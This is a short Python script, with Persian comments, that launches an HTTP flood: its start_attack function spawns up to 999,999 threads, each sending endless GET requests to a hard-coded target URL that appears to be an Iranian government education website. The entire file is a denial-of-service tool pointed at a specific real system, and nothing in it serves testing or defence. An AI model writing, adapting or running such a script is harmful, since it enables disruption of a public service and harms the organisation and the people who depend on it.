import threading
import requests

def send_request(url):
    try:
        while True:
            response = requests.get(url)
            print(f"Request sent to {url}, Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def start_attack(url, num_threads):
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(url,))
        thread.start()

if __name__ == "__main__":
    target_url = "https://kalat-razavi.medu.gov.ir"  # آدرس سرور هدف
    num_threads = 999999  # تعداد نخ‌ها برای ارسال درخواست‌ها
    start_attack(target_url, num_threads)
